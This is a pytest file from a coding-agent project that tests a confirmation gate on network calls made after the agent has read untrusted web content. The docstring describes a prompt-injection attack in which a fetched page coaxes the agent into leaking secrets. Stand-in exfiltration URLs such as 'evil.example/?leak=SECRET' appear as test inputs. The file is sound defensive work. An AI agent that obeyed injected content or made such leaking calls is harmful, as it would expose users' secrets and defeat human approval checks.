"""Phase 3.4 — injection-aware egress gating.

Threat: the model fetches an attacker-controlled page (untrusted), then the page's
content coaxes it into a *second* network call whose query string exfiltrates
secrets (``read_url("https://evil/?leak=…")``). Even though ``read_url`` is
read-only and may be on the approval allowlist, once the turn has ingested
untrusted external content any network-egress tool must require confirmation.

These tests drive the executor's confirmation gate directly.
"""

from __future__ import annotations

import json
from types import SimpleNamespace
from typing import Any, Dict
from unittest.mock import AsyncMock, MagicMock

import pytest

from coderAI.core.tool_executor import ToolExecutor
from coderAI.core.tool_error_codes import ToolErrorCode
from coderAI.system.history import Session
from coderAI.tools.base import ToolRegistry
from coderAI.tools.web.tools import ReadURLTool


def _make_agent(
    session: Session,
    registry: ToolRegistry,
    *,
    auto_approve: bool = False,
    allowlist: set[str] | None = None,
) -> Any:
    return SimpleNamespace(
        auto_approve=auto_approve,
        ipc_server=None,
        tools=registry,
        tracker_info=None,
        session=session,
        context_controller=SimpleNamespace(summarize_tool_result=lambda r: r),
        _sync_tracker=MagicMock(),
        _tool_approval_allowlist=allowlist if allowlist is not None else set(),
        config=None,
    )


def _tool_call(name: str, args: Dict[str, Any], tool_id: str = "t1") -> Dict[str, Any]:
    return {
        "id": tool_id,
        "type": "function",
        "function": {"name": name, "arguments": json.dumps(args)},
    }


async def _orchestrate(executor: ToolExecutor, session: Session, tc: Dict[str, Any]) -> None:
    session.add_message("assistant", None, tool_calls=[tc])
    await executor.orchestrate_tool_calls(
        tool_calls=[tc],
        messages=session.get_messages_for_api(),
        user_message="research this",
        hooks_data=None,
        hooks_manager=SimpleNamespace(run_hooks=AsyncMock(return_value=[])),
    )


def _patch_ok(monkeypatch: pytest.MonkeyPatch) -> None:
    import coderAI.tools.web as web_mod

    async def fake_cf(method: str, url: str, **kwargs: Any) -> Dict[str, Any]:
        return {
            "status": 200,
            "url": url,
            "text": "<html>ok</html>",
            "content_type": "text/html",
            "content": b"",
            "oversize": False,
            "headers": {},
        }

    monkeypatch.setattr(web_mod, "_safe_request_cf", fake_cf)


def _executor_with_read_url(agent: Any) -> ToolExecutor:
    return ToolExecutor(agent)


# ── the core gate ────────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_egress_confirmed_after_untrusted_ingest(monkeypatch: pytest.MonkeyPatch) -> None:
    """read_url → read_url: the second call must prompt for confirmation."""
    _patch_ok(monkeypatch)
    registry = ToolRegistry()
    registry.register(ReadURLTool())
    session = Session(session_id="session_egress")
    agent = _make_agent(session, registry, auto_approve=False)
    executor = _executor_with_read_url(agent)
    executor._confirmation_callback = AsyncMock(return_value=False)  # user denies

    # First fetch ingests untrusted content — not gated (nothing tainted yet).
    await _orchestrate(executor, session, _tool_call("read_url", {"url": "https://news.example/"}))
    executor._confirmation_callback.assert_not_awaited()
    assert executor._turn.ingested_untrusted is True

    # Second egress call is now gated and prompts.
    await _orchestrate(
        executor,
        session,
        _tool_call("read_url", {"url": "https://evil.example/?leak=SECRET"}, tool_id="t2"),
    )
    executor._confirmation_callback.assert_awaited()
    last = session.messages[-1]
    assert last.role == "tool"
    assert ToolErrorCode.DENIED in (last.content or "")


@pytest.mark.asyncio
async def test_first_egress_without_taint_is_not_gated(monkeypatch: pytest.MonkeyPatch) -> None:
    """A single read_url with a clean turn must not prompt (read-only, untainted)."""
    _patch_ok(monkeypatch)
    registry = ToolRegistry()
    registry.register(ReadURLTool())
    session = Session(session_id="session_clean")
    agent = _make_agent(session, registry, auto_approve=False)
    executor = _executor_with_read_url(agent)
    executor._confirmation_callback = AsyncMock(return_value=False)

    await _orchestrate(executor, session, _tool_call("read_url", {"url": "https://docs.example/"}))
    executor._confirmation_callback.assert_not_awaited()


@pytest.mark.asyncio
async def test_egress_gate_bypasses_name_allowlist(monkeypatch: pytest.MonkeyPatch) -> None:
    """`/allow-tool read_url` must NOT let a tainted turn exfiltrate silently."""
    _patch_ok(monkeypatch)
    registry = ToolRegistry()
    registry.register(ReadURLTool())
    session = Session(session_id="session_allowlist")
    agent = _make_agent(session, registry, auto_approve=False, allowlist={"read_url"})
    executor = _executor_with_read_url(agent)
    executor._turn.ingested_untrusted = True  # a prior fetch this turn tainted it
    executor._confirmation_callback = AsyncMock(return_value=False)

    await _orchestrate(
        executor, session, _tool_call("read_url", {"url": "https://evil.example/?d=SECRET"})
    )
    executor._confirmation_callback.assert_awaited()


@pytest.mark.asyncio
async def test_yolo_still_bypasses_egress_gate(monkeypatch: pytest.MonkeyPatch) -> None:
    """auto_approve (YOLO) is the documented master switch — egress gate defers to it."""
    _patch_ok(monkeypatch)
    registry = ToolRegistry()
    registry.register(ReadURLTool())
    session = Session(session_id="session_yolo")
    agent = _make_agent(session, registry, auto_approve=True)
    executor = _executor_with_read_url(agent)
    executor._turn.ingested_untrusted = True
    executor._confirmation_callback = AsyncMock(return_value=False)

    await _orchestrate(
        executor, session, _tool_call("read_url", {"url": "https://evil.example/?d=SECRET"})
    )
    executor._confirmation_callback.assert_not_awaited()
    # The fetch actually ran (not denied).
    assert ToolErrorCode.DENIED not in (session.messages[-1].content or "")
